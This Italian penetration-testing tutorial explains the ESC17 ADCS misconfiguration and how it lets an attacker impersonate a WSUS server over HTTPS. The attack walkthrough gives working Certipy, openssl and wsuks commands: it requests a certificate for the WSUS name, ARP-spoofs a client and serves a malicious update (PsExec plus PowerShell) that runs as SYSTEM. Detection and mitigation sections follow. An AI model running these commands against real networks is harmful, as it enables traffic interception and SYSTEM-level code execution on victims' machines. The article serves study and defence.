---
title: 'ESC17 ADCS: attacco MITM ai client WSUS su HTTPS'
slug: esc17-adcs
description: 'ESC17 ADCS sfrutta SAN controllabili per impersonare WSUS su HTTPS. Scopri richiesta del certificato con Certipy, MITM con wsuks, privesc e detection. '
image: /esc17-adcs-wsus-https.webp
draft: false
date: 2026-07-21T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ESC17
  - WSUS
  - wsuks
  - SAN
---

# ESC17 ADCS: come i SAN controllabili compromettono WSUS su HTTPS

**ESC17** è la 17ª tecnica di privilege escalation ADCS: template con `Enrollee Supplies Subject` abilitato che permettono di controllare il **SAN** di un certificato per farlo emettere per **qualsiasi nome di dominio interno**, non solo per impersonare un utente. Il bersaglio pratico dimostrato finora è **WSUS**, incluso su HTTPS — ma **solo se** l'attaccante riesce anche a intercettare/ridirigere il traffico verso il servizio impersonato, e solo se quel servizio non fa certificate pinning.

> **Nota:** ESC17 non è una CVE e non è una classificazione ufficiale Microsoft. È il nome che due ricercatori (DigiTrace) hanno proposto per una catena di attacco basata su template ADCS mal configurati, poi adottato da Certipy nella propria enumerazione. Non indica un bug di Windows, ma un errore di configurazione.

***

## Timeline delle ricerche

| Quando           | Chi                                         | Cosa                                                                                                                         |
| ---------------- | ------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| 2015             | Paul Stone, Alex Chapman (Context IS)       | Primo attacco WSUS: injection di update malevoli via MITM (WSUSpect Proxy)                                                   |
| 2017-2020        | Vari (WSUXploit, GoSecure/PyWSUS)           | Tooling che automatizza l'attacco base                                                                                       |
| 2020             | GoSecure                                    | CVE-2020-1013: bypass di WSUS-HTTPS via proxy custom lato client                                                             |
| 2021             | GoSecure                                    | NTLM relay sfruttando le richieste WSUS (solo su HTTP)                                                                       |
| **Fine 2025**    | **Austin Coontz (TrustedSec)**              | Estende il relay a WSUS-**HTTPS**: mostra che si può ottenere un certificato dalla CA interna per impersonare il server WSUS |
| **Gennaio 2026** | **Alexander Neff, Phil Knüfer (DigiTrace)** | Generalizzano il problema: non è solo relay, è **code execution diretta**; propongono ufficialmente il numero **ESC17**      |
| **Inizio 2026**  | Progetto Certipy                            | Integra il rilevamento ESC17 nella wiki e nel tool                                                                           |

Il merito della scoperta iniziale (certificato ADCS per impersonare WSUS) va a **Coontz/TrustedSec**; DigiTrace ha generalizzato il pattern e gli ha dato un nome sistematico.

## Definizione tecnica completa

**Non basta un EKU "Server Authentication" per dichiarare un template ESC17.** La definizione corretta, per come la inquadra la stessa documentazione Certipy:

> ESC17 riguarda il controllo del **SAN** che permette di richiedere certificati per **nomi di dominio arbitrari** usati nello stabilire canali TLS. WSUS è il bersaglio dimostrato finora, ma in teoria qualsiasi nome di dominio può essere preso di mira — restano valide le normali protezioni TLS come il certificate pinning.

Gli EKU compatibili con lo sfruttamento non sono solo Server Authentication. Sono a rischio anche:

* **Server Authentication** (`1.3.6.1.5.5.7.3.1`) — il caso dimostrato con WSUS
* **Any Purpose** (`2.5.29.37.0`) — implicitamente include anche Server Authentication, oltre a tutti gli altri usi
* **Template senza EKU configurato** — equivale ad "Any Purpose" nella logica di enrollment, stessa esposizione

La combinazione completa che rende un template vulnerabile:

```text
Enrollee Supplies Subject: True
EKU: Server Authentication (o Any Purpose, o nessun EKU)
Enrollment accessibile a un gruppo ampio (es. Domain Users)
Requires Manager Approval: False
Authorized Signatures Required: 0
Template pubblicato e abilitato sulla CA
```

Manca anche uno di questi controlli? Il template non è (ancora) sfruttabile per questa via — ma vale la pena tenerlo d'occhio comunque.

### ESC1 vs ESC17 — differenza in una tabella

|                                         | ESC1                                   | ESC17                                                       |
| --------------------------------------- | -------------------------------------- | ----------------------------------------------------------- |
| Enrollee Supplies Subject               | Sì                                     | Sì                                                          |
| EKU richiesto                           | Client Authentication (o simili)       | Server Authentication / Any Purpose / nessun EKU            |
| Cosa impersoni                          | Un **account** AD (utente/macchina)    | Un **servizio/server** HTTPS interno                        |
| Autenticazione risultante               | Kerberos PKINIT / Schannel come utente | TLS server-side, il client si fida del certificato          |
| Mitigazione "ovvia" che spesso fallisce | —                                      | Restringere l'EKU (non basta se il SAN resta controllabile) |

## Impatto reale — dipende dal bersaglio

ESC17 non porta automaticamente a Domain Admin. Come per ESC8/ESC11, l'impatto dipende da cosa riesci a impersonare e da chi ci si connette:

| Scenario                                 | Impatto                                               |
| ---------------------------------------- | ----------------------------------------------------- |
| Intercettazione TLS generica             | Lettura/manipolazione del traffico                    |
| WSUS + NTLM relay                        | Relay dell'account macchina o utente che si autentica |
| WSUS + injection di update               | Esecuzione come `SYSTEM` sul client                   |
| Client con privilegi elevati compromesso | Possibile escalation ulteriore nel dominio            |
| Workstation normale                      | Lateral movement / privilege escalation locale        |

## Prerequisiti reali

Servono **entrambe** le condizioni:

* **Un template ESC17-vulnerabile** enrollabile dall'attaccante
* **Una posizione che permetta di intercettare o ridirigere il traffico** verso il servizio impersonato — non serve necessariamente essere sullo stesso segmento L2. Le opzioni concrete includono:
  * ARP spoofing (richiede stesso segmento di rete)
  * IPv6 Router Advertisement falsi (es. `mitm6`, richiede stesso segmento)
  * DNS poisoning o modifica di record DNS (può funzionare anche da remoto se hai accesso al DNS interno)
  * Controllo di uno switch, router o firewall sul percorso
  * Accesso a un hypervisor che ospita client o server coinvolti
  * Compromissione di un gateway o altro punto della rete nel percorso
* **Un server WSUS effettivamente configurato e in uso** dal client target

### Discovery completa del server WSUS

Non basta controllare `UseWUServer`. Recupera anche hostname, protocollo e porta:

```powershell
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v WUStatusServer
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v UseWUServer
```

Se hai solo credenziali di dominio (niente accesso RDP/fisico al client), `wsuks` include una modalità di sola discovery via GPO:

```bash
wsuks -u 'hackita' -p 'Hackita123' -d 'hackita.lab' --dc-ip 10.10.10.50 --only-discover
```

Porte WSUS standard da tenere a mente: **8530/TCP** per HTTP, **8531/TCP** per HTTPS.

***

## Testing ESC17 con Certipy — passo per passo

### Step 1 — Enumerazione ADCS

```bash
certipy find -u 'hackita@hackita.lab' -p 'Hackita123' -dc-ip 10.10.10.50 -vulnerable -enabled
```

Nell'output cerca (schematizzato):

```text
Certificate Templates
  0
    Template Name                  : WebServerTemplate
    Enabled                        : True
    Client Authentication          : False
    Server Authentication          : True
    Enrollee Supplies Subject      : True
    Requires Manager Approval      : False
    Authorized Signatures Required : 0
    Permissions
      Enrollment Permissions
        Enrollment Rights          : HACKITA.LAB\Domain Users
    [+] User Enrollable Principals : HACKITA.LAB\Domain Users
```

Controlla anche i template con `Any Purpose: True` o `Extended Key Usage` vuoto — rientrano nello stesso pattern anche se non compare esplicitamente "Server Authentication".

Per un'analisi più comoda su template numerosi, usa l'output strutturato:

```bash
certipy find -u 'hackita@hackita.lab' -p 'Hackita123' -dc-ip 10.10.10.50 -vulnerable -json
```

e poi filtra con `jq` i template con `Enrollee Supplies Subject` abilitato ed elenca chi può fare enroll:

```bash
jq -r '.["Certificate Templates"][] | select(.["Enrollee Supplies Subject"] and .Enabled) | "\(.["Template Name"])\n" + (.Permissions["Enrollment Permissions"]["Enrollment Rights"] | map(" " + .) | join("\n")) + "\n"' certipy_output.json
```

Utile soprattutto se la tua versione di Certipy non ha ancora l'etichetta ESC17 esplicita: questo filtro trova comunque i candidati corretti a colpo d'occhio.

### Step 2 — Richiedere il certificato con il SAN controllato

```bash
certipy req -u 'hackita@hackita.lab' -p 'Hackita123' -dc-ip 10.10.10.50 -target 'CA.HACKITA.LAB' -ca 'HACKITA-CA' -template 'WebServerTemplate' -subject 'CN=wsus.hackita.lab' -dns 'wsus.hackita.lab' -out 'wsus.hackita.lab.pfx'
```

Il flag `-dns` è quello che conta davvero — garantisce che il certificato sia valido per il nome DNS reale del servizio da impersonare. `-subject` allinea anche il Common Name, `-out` fissa il nome del file di output.

Output atteso:

```text
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Got certificate with DNS Host Name 'wsus.hackita.lab'
[*] Saving certificate and private key to 'wsus.hackita.lab.pfx'
```

`CERTSRV_E_TEMPLATE_DENIED`? Non hai permessi di enrollment — ricontrolla `[+] User Enrollable Principals`.

### Step 3 — Verificare cosa contiene davvero il certificato

Non fermarti al solo SAN — controlla anche EKU, validità e issuer:

```bash
openssl pkcs12 -in wsus.hackita.lab.pfx -nodes -passin pass: | openssl x509 -noout -subject -issuer -serial -dates -ext subjectAltName -ext extendedKeyUsage
```

Verifica in output:

```text
SAN DNS corretto (wsus.hackita.lab)
EKU Server Authentication presente
Issuer = la CA interna aziendale
Validità temporale coerente
```

Conversione in PEM (necessaria per `wsuks`):

```bash
openssl pkcs12 -in wsus.hackita.lab.pfx -out wsus.hackita.lab.pem -nodes -passin pass:
```

## Le due catene distinte: relay vs code execution

La ricerca descrive due percorsi di sfruttamento diversi, con impatto molto diverso:

```text
ESC17 → falso WSUS HTTPS → NTLM relay          → autenticazione rubata verso un altro target
ESC17 → falso WSUS HTTPS → injection di update → esecuzione come SYSTEM sul client
```

Il lavoro originale di Coontz mostrava principalmente il primo percorso (relay). DigiTrace ha dimostrato che con lo stesso certificato si può arrivare al secondo, molto più impattante: mettersi in mezzo al traffico WSUS reale e servire un aggiornamento malevolo.

**Precisazione importante sul payload:** il binario usato (`PsExec64.exe`) è un **eseguibile legittimamente firmato da Microsoft/SysInternals** — è proprio per questo che supera il controllo di firma di WSUS. L'attaccante non firma nulla di proprio: abbina a PsExec un comando o script PowerShell dannoso, eseguito con i privilegi con cui WSUS applica gli aggiornamenti (`SYSTEM`).

### Comando operativo con `wsuks`

```bash
sudo wsuks -t 10.10.10.100 --WSUS-Server wsus.hackita.lab --tls-cert wsus.hackita.lab.pem
```

* `-t` — IP del client vittima
* `--WSUS-Server` — nome DNS del server WSUS da impersonare (deve corrispondere al SAN del certificato)
* `--tls-cert` — il certificato PEM ottenuto allo Step 3 (supporto presente da `wsuks` **v1.1.0** in poi)

Il tool avvia il server WSUS falso in TLS sulla porta **8531**, esegue l'ARP spoofing automaticamente e attende il prossimo polling del client — che su Windows può richiedere fino a 24 ore.

***

## Detection

Non esiste un Event ID dedicato "ESC17", ma la Certification Authority genera eventi utili se l'auditing è abilitato (`auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable`):

| Event ID | Significato                                                   |
| -------- | ------------------------------------------------------------- |
| 4886     | Certificate Services ha ricevuto una richiesta di certificato |
| 4887     | Certificate Services ha approvato ed emesso un certificato    |
| 4888     | Certificate Services ha negato una richiesta                  |
| 4889     | Richiesta messa in stato pending                              |
| 4898     | La CA ha caricato un template                                 |
| 4899     | Un template è stato modificato                                |
| 4900     | I permessi di sicurezza di un template sono stati modificati  |

Per ESC17 specificamente, correla **4886/4887** con:

* template noto come sensibile (con `Enrollee Supplies Subject` + EKU compatibile)
* richiedente non abituale per quel template
* **SAN DNS diverso dall'hostname del richiedente** — questo è l'indicatore più specifico: un utente normale che richiede un certificato con SAN `wsus.hackita.lab` è estremamente sospetto
* SAN che corrisponde a nomi di servizi critici (WSUS, SCCM, endpoint manager, VPN, LDAPS)
* richiesta proveniente da una workstation qualunque anziché da un sistema di provisioning autorizzato

Sul lato rete/client, aggiungi:

* cambi improvvisi nella risoluzione DNS del nome WSUS
* certificato WSUS con seriale/thumbprint diverso da quello atteso
* risposte ARP duplicate per lo stesso IP
* Router Advertisement IPv6 da host non autorizzati
* connessioni sulla porta 8531 verso un IP diverso da quello ufficiale del server WSUS
* eventi anomali nel log `Microsoft-Windows-WindowsUpdateClient/Operational`

## Mitigazioni concrete

Sul template ADCS (la parte che conta davvero):

* Rivedi **ogni** template con `Enrollee Supplies Subject: True`, qualunque sia l'EKU — inclusi WebServer, SubCA, Any Purpose e template senza EKU esplicito
* Disabilita "Enrollee Supplies Subject" dove non serve, o richiedi manager approval + firme autorizzate
* Restringi enrollment/autoenrollment a gruppi specifici — evita `Authenticated Users`/`Domain Users` su template con questo pattern
* Rimuovi dalla CA i template non utilizzati
* Inventaria periodicamente i SAN emessi per nomi infrastrutturali sensibili (WSUS, SCCM, VPN...)
* Tratta la CA come asset **Tier 0**

Sul lato rete (non risolve il problema alla radice, ma interrompe alcune varianti della catena):

* Difese anti-ARP-spoofing (Dynamic ARP Inspection sugli switch gestiti)
* Disabilita IPv6 dove non serve, o usa RA Guard, per tagliare la strada a `mitm6`
* Segmentazione di rete tra client e infrastruttura di gestione (WSUS, SCCM...)

**Su WSUS specificamente:** non esiste una configurazione lato-WSUS che renda innocuo un certificato fraudolento ma emesso validamente dalla CA aziendale — il protocollo non fa trust-on-first-use. L'HTTPS resta comunque necessario (è il prerequisito minimo), ma la protezione reale è a monte, sul template.

## Troubleshooting

**Il certificato viene rifiutato durante i test**
Il SAN corrisponde esattamente all'hostname atteso? Il certificato è emesso dalla CA che il client ha già nel proprio trust store? L'EKU Server Authentication è effettivamente presente?

**Il client WSUS non scarica comunque aggiornamenti dal server falso**

```powershell
gpresult /r
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v UseWUServer
```

Se `UseWUServer` non è `1`, il client non usa WSUS — nessun certificato risolve il problema.

**Il template non risulta vulnerabile in `certipy find`**
Controlla singolarmente: Enrollment Rights, Requires Manager Approval (deve essere False), Authorized Signatures Required (deve essere 0), Enabled (pubblicato sulla CA), EKU esatto configurato.

## FAQ

**Basta usare HTTPS su WSUS per essere al sicuro?**
No — l'HTTPS non basta se un attaccante può ottenere un certificato "legittimo" per il nome del server WSUS dalla CA interna reale.

**Il certificate pinning blocca ESC17?**
Può impedire l'impersonazione quando il client verifica un certificato o una chiave pubblica specifica invece di fidarsi genericamente della catena CA. Non è però una protezione universalmente configurabile per WSUS, e la sua applicabilità dipende dal servizio bersaglio — non è una soluzione a taglia unica.

**ESC17 richiede per forza accesso alla stessa VLAN del client vittima?**
No solo per ARP spoofing/mitm6. Con controllo di DNS, switch, router o hypervisor la posizione richiesta può essere diversa — vedi la sezione prerequisiti.

**WSUS è ancora rilevante se Microsoft l'ha deprecato?**
Sì. WSUS è stato deprecato a settembre 2024 (nessuna nuova funzionalità), ma resta pienamente supportato per tutto il ciclo di vita di Windows Server 2025 — indicativamente fino al 2034-2035. Moltissimi ambienti enterprise continuano a usarlo, e ConfigMgr/SCCM lo usa internamente.

***

## Conclusione

ESC17 conferma un principio generale nell'hardening ADCS: la sicurezza di un template non si misura restringendo un solo campo (l'EKU) e dichiarandolo "fatto" — va valutata la combinazione completa di `Enrollee Supplies Subject`, EKU, enrollment rights, manager approval e firme richieste.

La tecnica è già abbastanza matura da essere finita in una macchina Hack The Box (tag `esc17`/`wsuks`/`wsus-hijack`) — segno che vale la pena conoscerla bene anche per le certificazioni OSCE3/AD-oriented, non solo in ambito pentest reale.

Fonte primaria e approfondimenti tecnici completi: **[DigiTrace — Using ADCS to Attack HTTPS-Enabled WSUS Clients](https://blog.digitrace.de/2026/01/using-adcs-to-attack-https-enabled-wsus-clients/)**.

Per continuare lo studio: [ESC1](https://hackita.it/articoli/esc1-adcs/), [ESC8](https://hackita.it/articoli/esc8-adcs/), [ADCS ESC1-ESC16 guida completa](https://hackita.it/articoli/adcs-esc1-esc16/), [active-directory](https://hackita.it/articoli/active-directory/), [windows-privilege-escalation](https://hackita.it/articoli/windows-privilege-escalation/).
